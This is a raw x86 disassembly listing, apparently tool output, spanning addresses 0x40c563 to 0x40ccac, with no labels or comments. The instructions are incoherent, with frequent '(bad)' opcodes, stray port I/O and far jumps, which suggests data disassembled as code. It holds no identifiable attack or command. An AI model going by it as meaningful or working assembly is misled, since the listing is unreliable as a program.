  40c563:	cs out dx,al
  40c565:	push   ds
  40c566:	dec    esp
  40c567:	sbb    al,0xfc
  40c569:	aad    0xcb
  40c56b:	push   esi
  40c56c:	dec    esi
  40c56d:	test   eax,0xe08bc72a
  40c572:	imul   ebx,DWORD PTR [ebp-0x14],0x7e
  40c576:	dec    esi
  40c577:	cmp    al,BYTE PTR [ecx]
  40c579:	xor    al,0x31
  40c57b:	pop    esi
  40c57c:	inc    ecx
  40c57d:	pop    ebx
  40c57e:	xchg   edx,eax
  40c57f:	jge    0x40c5ad
  40c581:	inc    ebx
  40c582:	jbe    0x40c523
  40c584:	cld    
  40c585:	jecxz  0x40c51d
  40c587:	pop    es
  40c588:	push   eax
  40c589:	icebp  
  40c58a:	int    0x61
  40c58c:	pop    eax
  40c58d:	ret    0xbc87
  40c590:	pushf  
  40c591:	mov    al,ds:0x2d2ced9
  40c596:	out    dx,eax
  40c597:	(bad)
  40c59a:	mov    eax,0x4cf4f10
  40c59f:	or     eax,0x4e8bf25d
  40c5a4:	jbe    0x40c5e3
  40c5a6:	fsub   QWORD PTR [edx]
  40c5a8:	push   ebx
  40c5a9:	test   al,0xdd
  40c5ab:	or     BYTE PTR [esi-0x49],ch
  40c5ae:	push   edi
  40c5af:	cmp    al,0xb9
  40c5b1:	call   0x6a79:0x72bcfb24
  40c5b8:	mov    ebx,0x5811cdd
  40c5bd:	fwait
  40c5be:	test   ch,bh
  40c5c0:	dec    ecx
  40c5c1:	icebp  
  40c5c2:	jmp    0x7ee8:0xc68983db
  40c5c9:	xor    DWORD PTR [esi],ecx
  40c5cb:	ret    
  40c5cc:	jmp    ecx
  40c5ce:	mov    ecx,0x8f46f574
  40c5d3:	cld    
  40c5d4:	jnp    0x40c631
  40c5d6:	mov    ecx,0x101a1f41
  40c5db:	cmp    esi,DWORD PTR [edx+0x2e]
  40c5de:	xor    BYTE PTR [esi],dh
  40c5e0:	pop    es
  40c5e1:	pop    ebp
  40c5e2:	ins    DWORD PTR es:[edi],dx
  40c5e3:	pusha  
  40c5e4:	sbb    edi,DWORD PTR [esi+0x71c1a2e3]
  40c5ea:	push   es
  40c5eb:	test   DWORD PTR [ebx],esi
  40c5ed:	sub    ecx,DWORD PTR [esi+edi*1+0x11]
  40c5f1:	xchg   ebp,eax
  40c5f2:	sbb    BYTE PTR [ebx-0x7755eac8],0x68
  40c5f9:	pop    esi
  40c5fa:	push   esi
  40c5fb:	jle    0x40c5c7
  40c5fd:	mov    ch,BYTE PTR [ebx+0x535c86af]
  40c603:	pop    ecx
  40c604:	cwde   
  40c605:	dec    esi
  40c606:	and    al,0x44
  40c608:	fbld   TBYTE PTR [esi+0x51]
  40c60b:	ror    DWORD PTR [esi+0x31],1
  40c60e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c60f:	fstp   QWORD PTR [esi+0x1f5f80c3]
  40c615:	xor    al,0xe5
  40c617:	aad    0x81
  40c619:	pop    edx
  40c61a:	mov    esp,0x9ddc6090
  40c61f:	popa   
  40c620:	rol    BYTE PTR [ebx],cl
  40c622:	xor    eax,DWORD PTR [ebx-0x3c8c545e]
  40c628:	inc    esp
  40c629:	imul   esi,DWORD PTR [eax+edi*2-0xc],0x466d0380
  40c631:	cvtdq2ps xmm1,XMMWORD PTR [bx-0x714]
  40c637:	sahf   
  40c638:	lods   al,BYTE PTR ds:[esi]
  40c639:	xchg   ebx,eax
  40c63a:	aam    0x77
  40c63c:	pushf  
  40c63d:	fdiv   QWORD PTR [edx+0x7194aa66]
  40c643:	jl     0x40c67f
  40c645:	jnp    0x40c5f1
  40c647:	jp     0x40c634
  40c649:	fbstp  TBYTE PTR [esi]
  40c64b:	mov    eax,0x890b014b
  40c650:	jg     0x40c5ef
  40c652:	xor    BYTE PTR [esi],al
  40c654:	xchg   edi,eax
  40c655:	xchg   DWORD PTR [eax-0x40],ecx
  40c658:	outs   dx,DWORD PTR ds:[esi]
  40c659:	enter  0x8dae,0x4c
  40c65d:	mov    ds:0xca967acb,al
  40c662:	push   eax
  40c663:	imul   edx,edx,0x371d6638
  40c669:	popa   
  40c66a:	xchg   ecx,eax
  40c66b:	cs xchg ecx,eax
  40c66d:	repz push es
  40c66f:	lahf   
  40c670:	add    ah,ch
  40c672:	inc    DWORD PTR [esi-0x76]
  40c675:	(bad)  
  40c676:	dec    edi
  40c677:	sar    DWORD PTR [edx+0x19],0x6b
  40c67b:	pop    ds
  40c67c:	adc    esp,DWORD PTR [ebp-0x7c999072]
  40c682:	aad    0xd8
  40c684:	mov    bl,0x0
  40c686:	fnstenv [edx]
  40c688:	mov    ah,0x82
  40c68a:	or     BYTE PTR [edi],0x6
  40c68d:	int    0xe3
  40c68f:	int    0xe8
  40c691:	sbb    DWORD PTR [ebx+0x5ecb7f65],edi
  40c697:	dec    eax
  40c698:	mov    edi,0x7cd6ad78
  40c69d:	stos   DWORD PTR es:[edi],eax
  40c69e:	push   eax
  40c69f:	dec    ebp
  40c6a0:	mov    esi,0x51106c79
  40c6a5:	repnz inc ebx
  40c6a7:	pop    ebp
  40c6a8:	(bad)  
  40c6a9:	sbb    ebp,ebx
  40c6ab:	jl     0x40c726
  40c6ad:	inc    ebp
  40c6ae:	es jmp 0x40c637
  40c6b1:	jge    0x40c660
  40c6b3:	and    BYTE PTR [eax-0x59c842ca],cl
  40c6b9:	pop    ds
  40c6ba:	and    edi,DWORD PTR [ebx+edx*2-0x4be5474]
  40c6c1:	cmp    bh,ah
  40c6c3:	call   0xd0d2dc5e
  40c6c8:	mov    ch,0xad
  40c6ca:	test   BYTE PTR [edi-0x5ce4ef9e],bh
  40c6d0:	jno    0x40c6a8
  40c6d2:	sbb    bh,BYTE PTR [ebp-0x3f]
  40c6d5:	shl    DWORD PTR [ebp+0x2fef9b7e],1
  40c6db:	icebp  
  40c6dc:	add    ecx,DWORD PTR [esi+0x32be719e]
  40c6e2:	test   eax,0x9096fb97
  40c6e7:	jecxz  0x40c751
  40c6e9:	ja     0x40c710
  40c6eb:	mov    esp,0x6d8af5a8
  40c6f0:	lods   eax,DWORD PTR ds:[esi]
  40c6f1:	mov    dl,0x9
  40c6f3:	push   edi
  40c6f4:	and    al,bl
  40c6f6:	test   al,0x95
  40c6f8:	test   eax,0x5a42a68c
  40c6fd:	out    dx,al
  40c6fe:	cmp    eax,0x4fadd365
  40c703:	push   0xfffffff5
  40c705:	jo     0x40c6e0
  40c707:	retf   
  40c708:	jmp    0x90deab8b
  40c70d:	cmp    bl,dh
  40c70f:	adc    eax,0x930a9ba5
  40c714:	inc    esp
  40c715:	mov    dh,0x6a
  40c717:	push   cs
  40c718:	cmp    eax,0xc0d653aa
  40c71d:	xor    ah,BYTE PTR [edx+ebp*8-0x57]
  40c721:	mov    dh,0x27
  40c723:	pusha  
  40c724:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c725:	inc    edi
  40c726:	retf   0xe931
  40c729:	or     DWORD PTR [eax+ebp*4+0x6444e520],eax
  40c730:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c731:	mov    BYTE PTR [esi+eiz*8-0x25],bh
  40c735:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c736:	and    eax,0x46fee3d1
  40c73b:	and    ah,BYTE PTR [ebp+0x43]
  40c73e:	mov    al,ds:0xd9c4f42d
  40c743:	stc    
  40c744:	xchg   ecx,eax
  40c745:	or     ch,BYTE PTR [ecx-0xdb0c49f]
  40c74b:	popf   
  40c74c:	xchg   ecx,eax
  40c74d:	int3   
  40c74e:	dec    edi
  40c74f:	add    BYTE PTR [esp+edx*4],al
  40c752:	div    DWORD PTR [edx+0x4c]
  40c755:	jns    0x40c787
  40c757:	popf   
  40c758:	arpl   WORD PTR [esi+0x19],dx
  40c75b:	push   ss
  40c75c:	add    esi,DWORD PTR [esi]
  40c75e:	lock mov bl,0xcb
  40c761:	fs mov ecx,0x348ad004
  40c767:	inc    ebx
  40c768:	xlat   BYTE PTR ds:[ebx]
  40c769:	hlt    
  40c76a:	ficomp DWORD PTR [ebp+0xdf5b205]
  40c770:	sbb    BYTE PTR [edx+eiz*2-0x55ba4492],ch
  40c777:	outs   dx,BYTE PTR ds:[esi]
  40c778:	and    ebp,DWORD PTR [ebp-0x72e4afe3]
  40c77e:	out    dx,al
  40c77f:	(bad)  
  40c780:	or     BYTE PTR [ebx+0x63],bh
  40c783:	mov    DWORD PTR [ecx],ebx
  40c785:	push   ebx
  40c786:	leave  
  40c787:	mov    bl,0xb1
  40c789:	lea    eax,[eax]
  40c78b:	jo     0x40c73a
  40c78d:	fucomp st(2)
  40c78f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c790:	mov    cl,0xa8
  40c792:	xchg   esi,eax
  40c793:	ins    DWORD PTR es:[edi],dx
  40c794:	jno    0x40c7cf
  40c796:	adc    DWORD PTR [edx],esi
  40c798:	xchg   al,ch
  40c79a:	xchg   ecx,eax
  40c79b:	cmp    ebx,DWORD PTR [ebp+ebx*4-0x175e0453]
  40c7a2:	push   ecx
  40c7a3:	sub    BYTE PTR [edx],dh
  40c7a5:	mov    al,0x1a
  40c7a7:	stos   BYTE PTR es:[edi],al
  40c7a8:	(bad)  
  40c7a9:	scas   eax,DWORD PTR es:[edi]
  40c7aa:	jg     0x40c7a7
  40c7ac:	in     al,dx
  40c7ad:	pop    edx
  40c7ae:	cld    
  40c7af:	jge    0x40c784
  40c7b1:	adc    dh,bh
  40c7b3:	or     eax,0x27dd8b27
  40c7b8:	mov    edi,0x98f1a332
  40c7bd:	stos   DWORD PTR es:[edi],eax
  40c7be:	inc    esp
  40c7bf:	xchg   DWORD PTR [ebp+0x2148d071],ecx
  40c7c5:	push   ss
  40c7c6:	in     eax,0x81
  40c7c8:	mov    eax,ds:0x8f92152e
  40c7cd:	cmc    
  40c7ce:	dec    ebx
  40c7cf:	out    0x4c,eax
  40c7d1:	lahf   
  40c7d2:	mov    ebx,0x1176dfd8
  40c7d7:	imul   ecx,DWORD PTR [ecx-0x72],0xe6100a87
  40c7de:	or     eax,0x5f6a1b3e
  40c7e3:	daa    
  40c7e4:	and    BYTE PTR [ebx+0x7041435c],cl
  40c7ea:	cmp    dh,ah
  40c7ec:	inc    esp
  40c7ed:	dec    esi
  40c7ee:	test   al,0x23
  40c7f0:	mov    eax,ds:0x7f765ce7
  40c7f5:	pusha  
  40c7f6:	retf   0xfdd7
  40c7f9:	jb     0x40c821
  40c7fb:	pop    eax
  40c7fc:	(bad)  
  40c7fd:	mov    bh,0xc
  40c7ff:	mov    edx,0xe530d27d
  40c804:	scas   al,BYTE PTR es:[edi]
  40c805:	inc    esp
  40c806:	test   bl,dh
  40c808:	xchg   ebp,eax
  40c809:	pusha  
  40c80a:	ins    DWORD PTR es:[edi],dx
  40c80b:	xor    eax,0x258b2144
  40c810:	sub    edi,DWORD PTR [ecx+0x40bbd6f3]
  40c816:	(bad)  
  40c817:	mov    bh,0xba
  40c819:	clc    
  40c81a:	jns    0x40c878
  40c81c:	add    al,0xf6
  40c81e:	(bad)  
  40c81f:	pushf  
  40c820:	and    eax,0x43ab60fe
  40c825:	dec    esi
  40c826:	mov    ebp,0x35bc0718
  40c82b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c82c:	mov    ah,0xd1
  40c82e:	dec    esi
  40c82f:	in     al,dx
  40c830:	cmp    dh,BYTE PTR [edx-0x3e7e62c9]
  40c836:	mov    eax,0xeb197ec7
  40c83b:	cmp    BYTE PTR [edi+0x5c],bl
  40c83e:	jl     0x40c85e
  40c840:	xchg   DWORD PTR [edx],esp
  40c842:	jge    0x40c880
  40c844:	add    eax,0x612106fd
  40c849:	dec    esi
  40c84a:	aas    
  40c84b:	pusha  
  40c84c:	push   eax
  40c84d:	cmp    edx,ebx
  40c84f:	stos   BYTE PTR es:[edi],al
  40c850:	jle    0x40c87b
  40c852:	test   eax,0xbe985884
  40c857:	and    BYTE PTR [ebx-0x5d8320d3],ah
  40c85d:	inc    edx
  40c85e:	es inc esp
  40c860:	pop    edi
  40c861:	test   eax,0x71802700
  40c866:	aad    0xb7
  40c868:	push   es
  40c869:	icebp  
  40c86a:	imul   edi,ecx,0x898b53c7
  40c870:	xchg   edi,eax
  40c871:	add    bl,BYTE PTR ds:0xc748d0a9
  40c877:	mov    ds:0x8c421cde,al
  40c87c:	imul   esp,DWORD PTR [esi],0x7c79f38
  40c882:	xor    al,0x18
  40c884:	jo     0x40c8bb
  40c886:	inc    ecx
  40c887:	outs   dx,DWORD PTR ds:[esi]
  40c888:	test   DWORD PTR [edi+0x70b6a950],edi
  40c88e:	push   0x3e
  40c890:	or     BYTE PTR [eax-0x2e038a8d],ch
  40c896:	cs jle 0x40c825
  40c899:	stc    
  40c89a:	out    dx,al
  40c89b:	ja     0x40c90e
  40c89d:	enter  0xc545,0xf
  40c8a1:	or     eax,0xdf95e99b
  40c8a6:	les    edi,FWORD PTR [edx+0x4f626137]
  40c8ac:	cli    
  40c8ad:	adc    al,0xf5
  40c8af:	test   dl,bh
  40c8b1:	inc    esp
  40c8b2:	pop    edx
  40c8b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8b4:	fmul   DWORD PTR [esi+0x26]
  40c8b7:	push   ecx
  40c8b8:	or     DWORD PTR [ebx-0x738e97a],ebp
  40c8be:	dec    eax
  40c8bf:	jno    0x40c877
  40c8c1:	dec    DWORD PTR [ebx-0x53]
  40c8c4:	add    eax,0xcb6acfe0
  40c8c9:	xlat   BYTE PTR ds:[ebx]
  40c8ca:	sti    
  40c8cb:	icebp  
  40c8cc:	inc    ecx
  40c8cd:	dec    edi
  40c8ce:	daa    
  40c8cf:	jle    0x40c874
  40c8d1:	scas   eax,DWORD PTR es:[edi]
  40c8d2:	push   eax
  40c8d3:	xlat   BYTE PTR ds:[ebx]
  40c8d4:	lock cli 
  40c8d6:	call   0x4ef1:0xecf95f7c
  40c8dd:	cld    
  40c8de:	cmp    BYTE PTR [edx],al
  40c8e0:	mov    bh,BYTE PTR [eax+eax*1+0x156de67c]
  40c8e7:	sahf   
  40c8e8:	push   0x53bee3e7
  40c8ed:	mov    al,ds:0xaacd66e0
  40c8f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8f3:	iret   
  40c8f4:	das    
  40c8f5:	fstp   DWORD PTR [ebx]
  40c8f7:	add    ebx,DWORD PTR [esi]
  40c8f9:	jo     0x40c93b
  40c8fb:	(bad)  
  40c8fc:	and    al,0x8
  40c8fe:	pusha  
  40c8ff:	push   0xb390c7a1
  40c904:	sbb    al,BYTE PTR [esi-0x416601ff]
  40c90a:	add    bh,cl
  40c90c:	xchg   BYTE PTR [ebx+0xc],cl
  40c90f:	js     0x40c97b
  40c911:	jbe    0x40c900
  40c913:	xchg   esp,eax
  40c914:	outs   dx,DWORD PTR ds:[esi]
  40c915:	int3   
  40c916:	aas    
  40c917:	jp     0x40c930
  40c919:	dec    esp
  40c91a:	pusha  
  40c91b:	lea    eax,[esi-0x42]
  40c91e:	pop    ebx
  40c91f:	mov    DWORD PTR [ecx-0x3e],eax
  40c922:	mov    bh,0x28
  40c924:	call   0xf346:0x7f0e9479
  40c92b:	les    esi,FWORD PTR [edi-0x75]
  40c92e:	xlat   BYTE PTR ds:[ebx]
  40c92f:	sub    edi,eax
  40c931:	sbb    bl,cl
  40c933:	dec    eax
  40c934:	call   0x178f:0x375b0a84
  40c93b:	cmc    
  40c93c:	imul   esp,DWORD PTR [ebx],0x187c7d4c
  40c942:	dec    ebx
  40c943:	mov    ch,0x59
  40c945:	mov    ds,WORD PTR [edi-0x5a3fceaf]
  40c94b:	dec    ecx
  40c94c:	fucomip st,st(6)
  40c94e:	data16 (bad) 
  40c950:	lods   al,BYTE PTR ds:[esi]
  40c951:	cmp    BYTE PTR [ecx-0xd],ch
  40c954:	add    edi,eax
  40c956:	aad    0xd5
  40c958:	mov    eax,DWORD PTR [edi+edx*1-0x54f770b5]
  40c95f:	inc    edi
  40c960:	xlat   BYTE PTR ds:[ebx]
  40c961:	sahf   
  40c962:	ja     0x40c989
  40c964:	aas    
  40c965:	xchg   ecx,eax
  40c966:	cmp    al,0x76
  40c968:	inc    esp
  40c969:	dec    esi
  40c96a:	sbb    edx,ecx
  40c96c:	mov    ebp,0x4f046324
  40c971:	mov    ebp,0x6bb0cecd
  40c976:	add    dh,BYTE PTR [esi]
  40c978:	mov    WORD PTR [ebx+0x4b48922b],es
  40c97e:	pop    ebp
  40c97f:	aad    0x1d
  40c981:	push   cs
  40c982:	aad    0xf7
  40c984:	xor    DWORD PTR [edx-0x3a252120],0x5c2c6d9
  40c98e:	jae    0x40c953
  40c990:	mov    fs,WORD PTR [edi-0x58]
  40c993:	xchg   edi,eax
  40c994:	inc    edx
  40c995:	cmp    ah,BYTE PTR [ebp+0x15]
  40c998:	adc    BYTE PTR [ecx-0x3f6c6ffd],dh
  40c99e:	jne    0x40c953
  40c9a0:	pop    ebp
  40c9a1:	int3   
  40c9a2:	js     0x40c947
  40c9a4:	and    ebx,esp
  40c9a6:	mov    esi,0xf3ad2c94
  40c9ab:	inc    edx
  40c9ac:	leave  
  40c9ad:	xchg   esp,eax
  40c9ae:	test   BYTE PTR [ebp+0x6d],ch
  40c9b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9b2:	dec    esi
  40c9b3:	fwait
  40c9b4:	dec    ebp
  40c9b5:	pop    ebp
  40c9b6:	imul   ebx,DWORD PTR [edi-0x2f],0x6ee930ce
  40c9bd:	popa   
  40c9be:	dec    eax
  40c9bf:	enter  0xf6ca,0x43
  40c9c3:	mov    esi,0x2d01d2c0
  40c9c8:	xchg   esp,eax
  40c9c9:	fcomp  DWORD PTR [esi+0x3f]
  40c9cc:	inc    al
  40c9ce:	lds    edi,FWORD PTR [ebp-0x49]
  40c9d1:	pop    edx
  40c9d2:	and    al,0xf2
  40c9d4:	in     al,0x75
  40c9d6:	fdiv   DWORD PTR [ebp-0x1d3a65e7]
  40c9dc:	push   0x501878ad
  40c9e1:	xor    al,0xc
  40c9e3:	ret    0x427c
  40c9e6:	lds    esi,FWORD PTR [edi+0x551062cf]
  40c9ec:	jl     0x40c9e7
  40c9ee:	mov    al,0x75
  40c9f0:	xor    DWORD PTR [esp+edx*1],ebx
  40c9f3:	push   eax
  40c9f4:	shl    DWORD PTR [eax-0x31],1
  40c9f7:	imul   eax,DWORD PTR [edx+esi*4+0x22ff0733],0x26aa2204
  40ca02:	ins    BYTE PTR es:[edi],dx
  40ca03:	std    
  40ca04:	or     DWORD PTR [edi],ecx
  40ca06:	sbb    ebp,DWORD PTR [ecx+0x36e0762a]
  40ca0c:	mov    ah,0x3
  40ca0e:	cli    
  40ca0f:	mov    esp,DWORD PTR [ebp+0x14]
  40ca12:	dec    edi
  40ca13:	bnd ja 0x40c9ef
  40ca16:	retf   
  40ca17:	xor    DWORD PTR [ebx+0xd],edx
  40ca1a:	push   0xffffffab
  40ca1c:	mov    DWORD PTR ds:0x25e9c63b,ecx
  40ca22:	inc    ebx
  40ca23:	sbb    BYTE PTR [edx],0x5a
  40ca26:	mov    ebx,0xb4736309
  40ca2b:	push   ebx
  40ca2c:	jbe    0x40ca4a
  40ca2e:	test   DWORD PTR [eax-0x31],edi
  40ca31:	lods   eax,DWORD PTR ds:[esi]
  40ca32:	push   ebp
  40ca33:	jne    0x40ca45
  40ca35:	mov    esi,DWORD PTR [esi-0x40]
  40ca38:	jno    0x40c9eb
  40ca3a:	adc    BYTE PTR [esp+edi*2+0x4d],0x3e
  40ca3f:	push   esi
  40ca40:	and    DWORD PTR [esi+esi*4-0x47],ecx
  40ca44:	in     eax,dx
  40ca45:	loop   0x40c9f1
  40ca47:	jle    0x40ca37
  40ca49:	inc    ebp
  40ca4a:	repz xchg edx,eax
  40ca4c:	pop    eax
  40ca4d:	xchg   esp,eax
  40ca4e:	xchg   esi,eax
  40ca4f:	cmp    eax,DWORD PTR [esp+ebp*2+0x10]
  40ca53:	inc    ecx
  40ca54:	test   ch,bh
  40ca56:	scas   al,BYTE PTR es:[edi]
  40ca57:	fdivr  DWORD PTR [esi+0x718e6abd]
  40ca5d:	adc    al,0xa1
  40ca5f:	pop    ebp
  40ca60:	pop    ds
  40ca61:	fucomip st,st(6)
  40ca63:	and    dl,dh
  40ca65:	jle    0x40cad5
  40ca67:	test   eax,0x78cf2c03
  40ca6c:	push   ecx
  40ca6d:	imul   ecx,DWORD PTR [edx],0xffffff8b
  40ca70:	mov    ch,0x17
  40ca72:	dec    edi
  40ca73:	repz in al,dx
  40ca75:	jb     0x40ca7c
  40ca77:	sub    al,0xcd
  40ca79:	mov    fs,WORD PTR [edx]
  40ca7b:	(bad)  
  40ca7c:	call   0x6dcc42c9
  40ca81:	adc    bh,BYTE PTR [edi+esi*2-0x29]
  40ca85:	out    dx,al
  40ca86:	sbb    ebx,DWORD PTR [edx]
  40ca88:	adc    al,0x7c
  40ca8a:	imul   ebp,DWORD PTR [edi],0xffffff93
  40ca8d:	popf   
  40ca8e:	js     0x40cade
  40ca90:	in     eax,0x7c
  40ca92:	mov    ebp,0x9dd8da71
  40ca97:	jae    0x40ca71
  40ca99:	pushf  
  40ca9a:	cmp    ah,dh
  40ca9c:	out    0xa4,eax
  40ca9e:	stc    
  40ca9f:	es xor ah,bl
  40caa2:	mov    ds:0xfcc19dde,eax
  40caa7:	pop    ebx
  40caa8:	fldenv [ecx]
  40caaa:	push   0x7d79937d
  40caaf:	fild   QWORD PTR [ebx]
  40cab1:	std    
  40cab2:	mov    esi,0xcab39547
  40cab7:	pop    ebp
  40cab8:	xchg   esi,eax
  40cab9:	xlat   BYTE PTR ds:[ebx]
  40caba:	pop    ds
  40cabb:	rcr    DWORD PTR [ecx+ecx*4+0x432b7f60],0x73
  40cac3:	imul   ebp,DWORD PTR [ecx-0x2e6bfab3],0x870b28c1
  40cacd:	xor    eax,0xb50b154c
  40cad2:	mov    edi,DWORD PTR [edx-0x83631fd]
  40cad8:	push   edx
  40cad9:	pop    ss
  40cada:	je     0x40cab4
  40cadc:	ret    
  40cadd:	popa   
  40cade:	mov    eax,ds:0x74588dab
  40cae3:	imul   ebx,DWORD PTR [edi],0x7383ee5d
  40cae9:	pop    ds
  40caea:	arpl   WORD PTR [esi],dx
  40caec:	mov    bh,0xc6
  40caee:	mov    cl,0xcf
  40caf0:	fwait
  40caf1:	test   BYTE PTR [eax-0x3d],ch
  40caf4:	sar    bh,cl
  40caf6:	sbb    esi,ebx
  40caf8:	pusha  
  40caf9:	jno    0x40cb4a
  40cafb:	scas   eax,DWORD PTR es:[edi]
  40cafc:	out    dx,eax
  40cafd:	fldenv [ebx-0xf]
  40cb00:	(bad)  
  40cb01:	stc    
  40cb02:	lea    edi,ds:0x263656e
  40cb08:	pop    ds
  40cb09:	(bad)  
  40cb0a:	out    dx,al
  40cb0b:	inc    edi
  40cb0c:	pop    ss
  40cb0d:	cmp    al,0x51
  40cb0f:	sbb    eax,0xbd0e8ab2
  40cb14:	mov    ebp,0x6d0cbd42
  40cb19:	dec    esp
  40cb1a:	dec    esi
  40cb1b:	(bad)  
  40cb1c:	adc    edx,ebp
  40cb1e:	test   BYTE PTR [ecx+0x72],0x66
  40cb22:	cmp    edx,DWORD PTR [esi-0x5b38ffd]
  40cb28:	ins    DWORD PTR es:[edi],dx
  40cb29:	ss stc 
  40cb2b:	adc    eax,0xbf9fe74d
  40cb30:	xor    DWORD PTR [ecx-0x296ef03d],edi
  40cb36:	dec    ebp
  40cb37:	inc    ebx
  40cb38:	jmp    0xd126:0x961b0f76
  40cb3f:	push   es
  40cb40:	jl     0x40cbb2
  40cb42:	add    DWORD PTR [edi],ebp
  40cb44:	or     DWORD PTR [esi+0xa],esp
  40cb47:	pop    edi
  40cb48:	inc    esp
  40cb49:	adc    DWORD PTR [edx-0x707a4687],ebp
  40cb4f:	push   ds
  40cb50:	ret    
  40cb51:	mov    ebx,esp
  40cb53:	xchg   edx,eax
  40cb54:	pop    edi
  40cb55:	adc    dl,BYTE PTR [ecx]
  40cb57:	call   0xf84a:0xc943698f
  40cb5e:	dec    ecx
  40cb5f:	fnstenv [eax+ebx*8+0x7f]
  40cb63:	int3   
  40cb64:	inc    eax
  40cb65:	add    edx,DWORD PTR [ebx]
  40cb67:	or     eax,0xd895d216
  40cb6c:	pop    esi
  40cb6d:	pop    esp
  40cb6e:	(bad)  
  40cb6f:	xchg   ecx,eax
  40cb70:	retf   
  40cb71:	popa   
  40cb72:	out    dx,eax
  40cb73:	xchg   BYTE PTR [edi+0x40],ch
  40cb76:	pushf  
  40cb77:	mul    DWORD PTR [edx]
  40cb79:	fiadd  WORD PTR [ecx+eiz*1-0x75]
  40cb7d:	add    al,0x6d
  40cb7f:	pop    esp
  40cb80:	imul   esp,DWORD PTR [edx+0x68],0xf4231ac4
  40cb87:	sub    ecx,DWORD PTR [ebx]
  40cb89:	fstp   TBYTE PTR ds:[ecx]
  40cb8c:	mov    esp,0xb42d82b1
  40cb91:	arpl   ax,ax
  40cb93:	imul   esi,DWORD PTR [eax+eiz*2],0xf678972
  40cb9a:	das    
  40cb9b:	push   eax
  40cb9c:	mov    al,ds:0xd5c2f1c6
  40cba1:	enter  0x35ff,0x52
  40cba5:	nop
  40cba6:	or     dl,ah
  40cba8:	xchg   edi,eax
  40cba9:	rcl    DWORD PTR [edi-0x18],0x5
  40cbad:	fidivr WORD PTR [ecx+0x2]
  40cbb0:	pop    ecx
  40cbb1:	std    
  40cbb2:	in     eax,0xab
  40cbb4:	jmp    0xbde5:0x515fc8d5
  40cbbb:	adc    eax,0x4f444da7
  40cbc0:	push   eax
  40cbc1:	test   eax,0xe81d9db2
  40cbc6:	xchg   ebx,eax
  40cbc7:	popf   
  40cbc8:	mov    dh,ah
  40cbca:	pop    ecx
  40cbcb:	push   eax
  40cbcc:	scas   al,BYTE PTR es:[edi]
  40cbcd:	lods   eax,DWORD PTR ds:[esi]
  40cbce:	cwde   
  40cbcf:	mov    cl,0x85
  40cbd1:	not    esi
  40cbd3:	out    0xea,eax
  40cbd5:	sahf   
  40cbd6:	arpl   WORD PTR [esi-0xede8a6],cx
  40cbdc:	loopne 0x40cc25
  40cbde:	and    bl,BYTE PTR [edi+0xa3aef89]
  40cbe4:	jp     0x40cc4a
  40cbe6:	xor    cl,ch
  40cbe8:	mov    cl,0x3b
  40cbea:	sbb    eax,DWORD PTR ds:0x4b259c9b
  40cbf0:	iretw  
  40cbf2:	jge    0x40cc49
  40cbf4:	push   eax
  40cbf5:	sbb    DWORD PTR [esi],ebx
  40cbf7:	xchg   BYTE PTR [esi+ebp*2],ah
  40cbfa:	jnp    0x40cb9f
  40cbfc:	enter  0x7326,0x28
  40cc00:	dec    ebx
  40cc01:	cmp    eax,0x7ff0dc8f
  40cc06:	sbb    DWORD PTR [ebx+0x3b],edx
  40cc09:	push   ds
  40cc0a:	pusha  
  40cc0b:	mov    ecx,0x5e12c7bd
  40cc10:	sbb    eax,edi
  40cc12:	dec    esp
  40cc13:	rcr    DWORD PTR [ebx],0xbd
  40cc16:	mov    ah,BYTE PTR [edi+0x65db2662]
  40cc1c:	pop    ecx
  40cc1d:	jecxz  0x40cc75
  40cc1f:	dec    edx
  40cc20:	add    DWORD PTR [eax],eax
  40cc22:	mov    esp,0x18778379
  40cc27:	xchg   bl,cl
  40cc29:	ret    0x4968
  40cc2c:	xchg   ecx,eax
  40cc2d:	sti    
  40cc2e:	push   edx
  40cc2f:	lds    eax,FWORD PTR [esp-0x5e]
  40cc33:	cmp    BYTE PTR [eax-0xe],ah
  40cc36:	pusha  
  40cc37:	sbb    al,BYTE PTR [edi]
  40cc39:	adc    edx,DWORD PTR [edi-0x717ebe4a]
  40cc3f:	adc    BYTE PTR [ebx+ebp*1-0x450f36b],cl
  40cc46:	cmp    DWORD PTR [ebx+edx*2-0x65f08873],ebp
  40cc4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc4e:	mov    esp,0x4c30cb82
  40cc53:	lahf   
  40cc54:	push   es
  40cc55:	jmp    DWORD PTR [edi+ebp*1-0x20bab00e]
  40cc5c:	iret   
  40cc5d:	jge    0x40cc63
  40cc5f:	dec    eax
  40cc60:	fwait
  40cc61:	inc    eax
  40cc62:	ins    DWORD PTR es:[edi],dx
  40cc63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc64:	and    al,0x1c
  40cc66:	jecxz  0x40cca4
  40cc68:	sbb    DWORD PTR [edi],0x4f
  40cc6b:	jnp    0x40cc76
  40cc6d:	dec    edx
  40cc6e:	cmc    
  40cc6f:	mov    bl,0x71
  40cc71:	(bad)  
  40cc72:	(bad)  [ebx]
  40cc74:	mov    bh,0xf5
  40cc76:	xchg   BYTE PTR [ecx],dl
  40cc78:	cwde   
  40cc79:	xor    eax,0x7af455bd
  40cc7e:	sub    esp,DWORD PTR [ebx-0x28f1a9bb]
  40cc84:	adc    BYTE PTR [ebx+0x4a],0x35
  40cc88:	out    dx,eax
  40cc89:	push   esp
  40cc8a:	je     0x40cc85
  40cc8c:	scas   al,BYTE PTR es:[edi]
  40cc8d:	(bad)  
  40cc8e:	(bad)  
  40cc8f:	pop    ebp
  40cc90:	fs adc eax,0xd04a9a92
  40cc96:	cld    
  40cc97:	icebp  
  40cc98:	cs retf 0x4ebd
  40cc9c:	(bad)  
  40cc9d:	sbb    cl,BYTE PTR [ecx]
  40cc9f:	stc    
  40cca0:	pusha  
  40cca1:	leave  
  40cca2:	stc    
  40cca3:	fidiv  WORD PTR [esi]
  40cca5:	or     DWORD PTR ds:0xe0458e78,edi
  40ccab:	pusha  
  40ccac:	shr    DWORD PTR [ebp-0x73],cl
